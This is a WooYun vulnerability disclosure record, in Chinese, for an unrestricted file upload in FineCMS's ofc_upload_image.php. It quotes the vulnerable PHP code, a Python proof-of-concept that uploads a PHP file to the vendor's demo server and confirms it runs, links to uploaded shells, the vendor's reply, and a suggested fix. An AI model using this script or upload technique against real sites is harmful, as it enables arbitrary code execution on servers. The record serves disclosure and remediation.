{"id": 34889, "wybug_id": "wooyun-2015-0105251", "wybug_title": "FIneCMS免费版无条件getshell （附poc脚本）", "wybug_corp": "dayrui.com", "wybug_author": "1c3z", "wybug_date": "2015-04-07 17:44", "wybug_open_date": "2015-07-07 18:36", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-07：\t细节向公众公开  简要描述： 第一次，好紧张 详细说明：  路径：dayrui/libraries/Chart/ofc_upload_image.php\n$default_path = '../tmp-upload-images/';if (!file_exists($default_path)) mkdir($default_path, 0777, true);$destination = $default_path . basename( $_GET[ 'name' ] ); echo 'Saving your image to: '. $destination; $jfh = fopen($destination, 'w') or die(\"can't open file\");fwrite($jfh, $HTTP_RAW_POST_DATA);fclose($jfh);\n无任何限制，可以直接上传。。poc:\n#!/usr/bin/env python# -*- coding: utf-8 -*-#__author__ = '1c3z'import urllib2import randomfileName = \"shell\" + str(random.randrange(1000,9999)) + \".php\"target = \"http://v1.finecms.net/dayrui/libraries/Chart/ofc_upload_image.php\"def uploadShell():    url = target + \"?name=\" + fileName    req = urllib2.Request(url, headers={\"Content-Type\": \"application/oct\"})     res = urllib2.urlopen(req, data=\"<?print(md5(0x22))?>\")    return res.read()def poc():    res = uploadShell()    if res.find(\"tmp-upload-images\") == -1:        print \"Failed !\"        return    print \"upload Shell success\"    url = \"http://v1.finecms.net/dayrui/libraries/tmp-upload-images/\" + fileName    md5 = urllib2.urlopen(url).read()    if md5.find(\"e369853df766fa44e1ed0ff613f563bd\") != -1:        print \"poc: \" + urlpoc()\n   漏洞证明：  本地运行截图\n\ndeom poc:http://v2.finecms.net/dayrui/libraries/tmp-upload-images/shell2067.phphttp://v2.finecms.net/dayrui/libraries/tmp-upload-images/shell2277.php   修复方案：  好像没用到这个代码，删除即可   版权声明：转载请注明来源 1c3z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-08 18:34 厂商回复： 第一个，好害怕！！ 最新状态： 2015-04-08：可以作为ci来发布  ", "replys": "漏洞评价：\n评论\n     2015-04-19 16:44 |    \t\tElliott \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:9        | 绝逼不当程序员)\t\t \n  关注~    \n     2015-06-16 00:35 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  厂商别逗！跟CI有什么关系    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}